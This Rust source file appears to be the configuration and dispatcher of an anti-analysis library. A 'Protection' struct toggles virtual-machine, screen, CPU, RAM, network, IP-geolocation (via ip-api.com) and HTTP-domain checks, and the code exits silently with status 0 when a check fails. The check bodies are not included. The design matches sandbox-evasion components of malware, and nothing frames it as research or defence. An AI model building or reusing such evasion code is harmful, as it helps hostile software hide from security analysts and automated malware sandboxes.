use std::process;

pub struct Protection {
    pub(crate) ip_filter:      bool,
    pub(crate) http_filter:    bool,
    pub(crate) network_filter: bool,
    pub(crate) vm_filter:      bool,
    pub(crate) screen_filter:  bool,
    pub(crate) cpu_filter:     bool,
    pub(crate) ram_filter:     bool,
    pub(crate) http_url:       String,
    pub(crate) ip_api_url:     String,
    pub(crate) timeout_secs:   u64,
    pub(crate) filter_callback: Option<Box<dyn Fn()>>,
}

impl Default for Protection {
    fn default() -> Self {
        Self {
            ip_filter:      true,
            http_filter:    true,
            network_filter: true,
            vm_filter:      true,
            screen_filter:  true,
            cpu_filter:     true,
            ram_filter:     true,
            http_url:       String::from("http://femboyfurryantivmantivmalib.com"),
            ip_api_url:     String::from("http://ip-api.com/json/?fields=status,countryCode"),
            timeout_secs:   5,
            filter_callback: None,
        }
    }
}

impl Protection {
    pub(crate) fn run(&self) {
        if self.vm_filter     { self.check_vm();     }
        if self.screen_filter { self.check_screen(); }
        if self.cpu_filter    { self.check_cpu();    }
        if self.ram_filter    { self.check_ram();    }

        if self.network_filter { self.check_network(); }
        if self.ip_filter      { self.check_ip();      }
        if self.http_filter    { self.check_http();    }
    }

    pub(crate) fn on_fail(&self) {
        if let Some(callback) = &self.filter_callback {
            callback();
        } else {
            process::exit(0);
        }
    }
}
